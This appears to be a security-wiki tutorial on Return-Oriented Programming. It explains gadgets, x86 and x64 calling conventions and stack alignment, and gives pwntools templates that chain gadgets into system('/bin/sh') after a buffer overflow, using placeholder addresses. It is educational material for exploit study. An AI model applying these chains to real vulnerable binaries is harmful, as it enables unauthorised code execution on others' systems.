## **Basic Information**

**Return-Oriented Programming (ROP)** is an advanced exploitation technique used to circumvent security measures like **No-Execute (NX)** or **Data Execution Prevention (DEP)**. Instead of injecting and executing shellcode, an attacker leverages pieces of code already present in the binary or in loaded libraries, known as **"gadgets"**. Each gadget typically ends with a `ret` instruction and performs a small operation, such as moving data between registers or performing arithmetic operations. By chaining these gadgets together, an attacker can construct a payload to perform arbitrary operations, effectively bypassing NX/DEP protections.

### How ROP Works

1. **Control Flow Hijacking**: First, an attacker needs to hijack the control flow of a program, typically by exploiting a buffer overflow to overwrite a saved return address on the stack.
2. **Gadget Chaining**: The attacker then carefully selects and chains gadgets to perform the desired actions. This could involve setting up arguments for a function call, calling the function (e.g., `system("/bin/sh")`), and handling any necessary cleanup or additional operations.
3. **Payload Execution**: When the vulnerable function returns, instead of returning to a legitimate location, it starts executing the chain of gadgets.

### Tools

Typically, gadgets can be found using **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** or directly from **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## ROP Chain in x86 Example

### **x86 (32-bit) Calling conventions**

* **cdecl**: The caller cleans the stack. Function arguments are pushed onto the stack in reverse order (right-to-left). **Arguments are pushed onto the stack from right to left.**
* **stdcall**: Similar to cdecl, but the callee is responsible for cleaning the stack.

### **Finding Gadgets**

First, let's assume we've identified the necessary gadgets within the binary or its loaded libraries. The gadgets we're interested in are:

* `pop eax; ret`: This gadget pops the top value of the stack into the `EAX` register and then returns, allowing us to control `EAX`.
* `pop ebx; ret`: Similar to the above, but for the `EBX` register, enabling control over `EBX`.
* `mov [ebx], eax; ret`: Moves the value in `EAX` to the memory location pointed to by `EBX` and then returns. This is often called a **write-what-where gadget**.
* Additionally, we have the address of the `system()` function available.

### **ROP Chain**

Using **pwntools**, we prepare the stack for the ROP chain execution as follows aiming to execute `system('/bin/sh')`, note how the chain starts with:

1. A `ret` instruction for alignment purposes (optional)
2. Address of `system` function (supposing ASLR disabled and known libc, more info in [**Ret2lib**](ret2lib/))
3. Placeholder for the return address from `system()`
4. `"/bin/sh"` string address  (parameter for system function)

```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
    ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
    system_addr,   # Address of system(). Execution will continue here after the ret gadget
    0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
    bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```

## ROP Chain in x64 Example

### **x64 (64-bit) Calling conventions**

* Uses the **System V AMD64 ABI** calling convention on Unix-like systems, where the **first six integer or pointer arguments are passed in the registers `RDI`, `RSI`, `RDX`, `RCX`, `R8`, and `R9`**. Additional arguments are passed on the stack. The return value is placed in `RAX`.
* **Windows x64** calling convention uses `RCX`, `RDX`, `R8`, and `R9` for the first four integer or pointer arguments, with additional arguments passed on the stack. The return value is placed in `RAX`.
* **Registers**: 64-bit registers include `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, and `R8` to `R15`.

#### **Finding Gadgets**

For our purpose, let's focus on gadgets that will allow us to set the **RDI** register (to pass the **"/bin/sh"** string as an argument to **system()**) and then call the **system()** function. We'll assume we've identified the following gadgets:

* **pop rdi; ret**: Pops the top value of the stack into **RDI** and then returns. Essential for setting our argument for **system()**.
* **ret**: A simple return, useful for stack alignment in some scenarios.

And we know the address of the **system()** function.

### **ROP Chain**

Below is an example using **pwntools** to set up and execute a ROP chain aiming to execute **system('/bin/sh')** on **x64**:

```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
    ret_gadget,        # Alignment gadget, if needed
    pop_rdi_gadget,    # pop rdi; ret
    bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
    system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```

In this example:

* We utilize the **`pop rdi; ret`** gadget to set **`RDI`** to the address of **`"/bin/sh"`**.
* We directly jump to **`system()`** after setting **`RDI`**, with **system()**'s address in the chain.
* **`ret_gadget`** is used for alignment if the target environment requires it, which is more common in **x64** to ensure proper stack alignment before calling functions.

### Stack Alignment

**The x86-64 ABI** ensures that the **stack is 16-byte aligned** when a **call instruction** is executed. **LIBC**, to optimize performance, **uses SSE instructions** (like **movaps**) which require this alignment. If the stack isn't aligned properly (meaning **RSP** isn't a multiple of 16), calls to functions like **system** will fail in a **ROP chain**. To fix this, simply add a **ret gadget** before calling **system** in your ROP chain.

## x86 vs x64 main difference

{% hint style="success" %}
Since x64 uses registers for the first few arguments, it often requires fewer gadgets than x86 for simple function calls, but finding and chaining the right gadgets can be more complex due to the increased number of registers and the larger address space. The increased number of registers and the larger address space in **x64** architecture provide both opportunities and challenges for exploit development, especially in the context of Return-Oriented Programming (ROP).

## ROP based techniques

Notice that ROP is just a technique in order to execute arbitrary code. Based in ROP a lot of Ret2XXX techniques were developed:

* **Ret2lib**: Use ROP to call arbitrary functions from a loaded library with arbitrary parameters (usually something like `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Use ROP to prepare a call to a syscall, e.g. `execve`, and make it execute arbitrary commands.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: The first will abuse EBP instead of EIP to control the flow and the second is similar to Ret2lib but in this case the flow is controlled mainly with EBP addresses (although t's also needed to control EIP).
